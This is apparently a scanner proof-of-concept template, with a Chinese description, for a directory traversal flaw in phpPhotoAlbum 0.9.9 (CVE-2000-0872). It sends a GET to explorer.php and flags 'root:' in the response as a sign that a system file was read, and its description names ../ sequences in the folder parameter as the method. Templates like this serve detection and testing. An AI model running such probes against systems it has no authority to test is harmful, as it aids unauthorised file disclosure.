[info]
author = "ave"
description = "检测 phpphotoalbum 0.9.9 explorer.php 中的目录遍历漏洞，通过 folder 参数提交 ../ 序列访问任意文件"
id = "POC-AVE-2000-0642"
name = "PhotoAlbum 0.9.9 目录遍历漏洞 PoC"
severity = "high"
tags = ["ave-2000-0642"]
vuln_id = [
    "CVE-2000-0872",
    "AVE-2000-0642",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/phpPhotoAlbum/explorer.php"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
